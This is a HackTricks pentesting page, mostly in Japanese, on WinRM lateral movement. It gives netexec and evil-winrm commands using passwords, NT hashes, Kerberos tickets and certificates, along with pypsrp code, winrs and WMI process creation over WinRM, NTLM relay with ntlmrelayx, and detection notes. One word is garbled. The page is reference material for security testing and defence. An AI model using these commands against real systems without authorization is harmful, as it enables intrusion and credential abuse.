# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM は、Windows 環境における最も便利な **lateral movement** トランスポートの1つです。なぜなら、SMB のサービス作成トリックを使わずに **WS-Man/HTTP(S)** 経由でリモートシェルを取得できるからです。ターゲットが **5985/5986** を公開していて、かつあなたの principal が remoting の使用を許可されていれば、「有効な認証情報」から「対話型シェル」へ非常に سریعく移行できることがよくあります。

**protocol/service enumeration**、listeners、WinRM の有効化、`Invoke-Command`、一般的なクライアントの使い方については、以下を確認してください:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- SMB/RPC ではなく **HTTP/HTTPS** を使うため、PsExec 風の実行がブロックされる環境でも動作することが多い。
- **Kerberos** を使うことで、再利用可能な認証情報をターゲットに送らずに済む。
- **Windows**、**Linux**、および Python ツール (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) からきれいに使える。
- 対話型 PowerShell remoting の経路では、認証されたユーザーのコンテキストでターゲット上に **`wsmprovhost.exe`** が起動する。これは service-based exec とは運用上異なる。

## Access model and prerequisites

実際には、WinRM による lateral movement の成功は **3つ** に依存します:

1. ターゲットに **WinRM listener** (`5985`/`5986`) があり、アクセスを許可する firewall rule がある。
2. アカウントがエンドポイントに **authenticate** できる。
3. アカウントが remoting session を **開く** 権限を持っている。

そのアクセスを得る一般的な方法:

- ターゲット上で **Local Administrator**。
- 新しいシステムでは **Remote Management Users**、またはそのグループをまだ尊重するシステム/コンポーネントでは **WinRMRemoteWMIUsers__** のメンバーであること。
- local security descriptor / PowerShell remoting ACL の変更を通じて委任された明示的な remoting 権限。

すでに admin 権限で box を支配しているなら、ここで説明する techniques を使って **フル admin グループのメンバーでなくても WinRM access を委任できる** ことを覚えておいてください:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movement 中に重要な authentication の注意点

- **Kerberos には hostname/FQDN が必要**。IP で接続すると、クライアントは通常 **NTLM/Negotiate** にフォールバックする。
- **workgroup** または cross-trust の境界ケースでは、NTLM は一般に **HTTPS** か、クライアント側でターゲットを **TrustedHosts** に追加する必要がある。
- workgroup で **local accounts** を Negotiate 経由で使う場合、UAC の remote restrictions により、組み込み Administrator アカウントを使うか `LocalAccountTokenFilterPolicy=1` でない限りアクセスできないことがある。
- PowerShell remoting は既定で **`HTTP/<host>` SPN** を使う。`HTTP/<host>` がすでに別の service account に登録されている環境では、WinRM Kerberos は `0x80090322` で失敗することがある。その場合は port-qualified SPN を使うか、存在するなら **`WSMAN/<host>`** に切り替える。

password spraying 中に valid credentials を得たら、WinRM で検証するのが、それが shell につながるかを確認する最速の方法であることが多いです:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM for interactive shells

`evil-winrm` は、**passwords**、**NT hashes**、**Kerberos tickets**、**client certificates**、ファイル転送、そしてメモリ内での PowerShell/.NET のロードをサポートしているため、Linux から利用できる最も便利な対話型オプションであり続けています。
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

デフォルトの **`HTTP/<host>`** SPN が Kerberos の失敗を引き起こす場合は、代わりに **`WSMAN/<host>`** チケットの要求/使用を試してください。これは、`HTTP/<host>` がすでに別のサービスアカウントに紐付いている、ハードニングされた、または特殊な enterprise 環境で見られます。
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
これは、**RBCD / S4U** abuse の後で、汎用の `HTTP` ticket ではなく、特に **WSMAN** service ticket を forge したり要求したりした場合にも有用です。

### Certificate-based authentication

WinRM は **client certificate authentication** もサポートしていますが、certificate は target 側で **local account** に mapping されている必要があります。攻撃者視点では、これは次のような場合に重要です。

- WinRM 用にすでに mapping されている有効な client certificate と private key を盗んだ / export した場合;
- **AD CS / Pass-the-Certificate** を悪用して principal 用の certificate を取得し、その後別の authentication path に pivot する場合;
- password-based remoting を意図的に避けている environment で操作している場合。
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM は password/hash/Kerberos auth よりかなり一般的ではありませんが、存在する場合は password rotation をまたいで有効な **passwordless lateral movement** の経路を提供できます。

### Python / automation with `pypsrp`

operator shell ではなく automation が必要なら、`pypsrp` は Python から **NTLM**, **certificate auth**, **Kerberos**, **CredSSP** をサポートする WinRM/PSRP を提供します。
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` は組み込みで、対話的な PowerShell remoting セッションを開かずに **native WinRM command execution** を行いたい場合に便利です:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
運用上、`winrs.exe` は通常、次のようなリモートプロセスチェーンを生み出します:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
これは覚えておく価値があります。なぜなら、service-based exec や interactive PSRP sessions とは異なるためです。

### `winrm.cmd` / PowerShell remoting ではなく WS-Man COM

**WinRM transport** を使って、`Enter-PSSession` を使わずに、WS-Man 経由で WMI classes を呼び出すことでも実行できます。これにより transport は WinRM のまま維持されますが、remote execution primitive は **WMI `Win32_Process.Create`** になります:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
そのアプローチは次のような場合に有用です。

- PowerShell logging が強く監視されている。
- classic な PS remoting workflow ではなく、**WinRM transport** が欲しい。
- **`WSMan.Automation`** COM object を中心に custom tooling を構築している、または使用している。

## NTLM relay to WinRM (WS-Man)

SMB relay が signing によってブロックされ、LDAP relay に制約がある場合でも、**WS-Man/WinRM** は依然として魅力的な relay target になり得ます。最新の `ntlmrelayx.py` には **WinRM relay servers** が含まれており、**`wsman://`** または **`winrms://`** targets へ relay できます。
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Two practical notes:

- Relay is most useful when the target accepts **NTLM** and the relayed principal is allowed to use WinRM.
- Recent Impacket code specifically handles **`WSMANIDENTIFY: unauthenticated`** requests so `Test-WSMan`-style probes do not break the relay flow.

For multi-hop constraints after landing a first WinRM session, check:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** usually creates **`wsmprovhost.exe`** on the target.
- **`winrs.exe`** commonly creates **`winrshost.exe`** and then the requested child process.
- Expect **network logon** telemetry, WinRM service events, and PowerShell operational/script-block logging if you use PSRP rather than raw `cmd.exe`.
- If you only need a single command, `winrs.exe` or one-shot WinRM execution may be quieter than a long-lived interactive remoting session.
- If Kerberos is available, prefer **FQDN + Kerberos** over IP + NTLM to reduce both trust issues and awkward client-side `TrustedHosts` changes.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
